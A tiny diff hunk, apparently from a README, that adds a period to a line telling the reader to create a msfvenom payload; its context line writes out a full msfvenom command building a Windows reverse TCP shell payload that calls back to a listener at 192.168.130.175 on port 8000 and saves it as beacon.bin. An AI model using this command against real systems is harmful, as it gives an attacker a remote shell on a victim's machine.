@@ -1,4 +1,4 @@
->To make this work,create a msfvenom payload
+>To make this work,create a msfvenom payload.
 
 >msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.130.175 LPORT=8000 -f raw >beacon.bin
 
